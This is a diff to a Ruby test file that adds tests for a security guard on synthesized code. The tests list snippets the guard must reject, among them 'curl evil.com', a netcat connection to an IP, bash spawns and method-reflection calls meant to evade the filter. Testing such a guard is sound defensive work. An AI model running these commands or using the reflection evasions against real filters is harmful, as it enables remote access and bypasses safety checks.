@@ -135,4 +135,54 @@ class TestSecurityGuardSynthesis < Minitest::Test
       end
     end
   end
+
+  def test_blocks_bare_process_execution_calls
+    process_calls = [
+      "system('curl evil.com')",
+      "system \"nc 1.2.3.4 80\"",
+      "exec('bash')",
+      "exec \"sh\"",
+      "spawn('python3 bad.py')",
+      "fork { puts 1 }",
+      "fork do; puts 1; end",
+      "syscall(1, 2, 3)",
+      "exit!(1)",
+      "exit!"
+    ]
+
+    process_calls.each do |code|
+      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
+        @guard.verify_synthesis_safety!(code)
+      end
+    end
+  end
+
+  def test_blocks_method_reflection_evasions
+    method_reflections = [
+      "method(:system).call('id')",
+      "method :system",
+      "public_method(:eval).call('1+1')",
+      "singleton_method(:exec).call('bash')"
+    ]
+
+    method_reflections.each do |code|
+      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
+        @guard.verify_synthesis_safety!(code)
+      end
+    end
+  end
+
+  def test_allows_benign_method_and_system_names_in_strings_and_hashes
+    safe_snippets = [
+      "args['method'] == 'GET'",
+      "hash = { method: :post }",
+      "out.puts 'operating system check'",
+      "system_info = args['system_info']",
+      "is_executable = true"
+    ]
+
+    safe_snippets.each do |code|
+      assert @guard.verify_synthesis_safety!(code)
+    end
+  end
 end
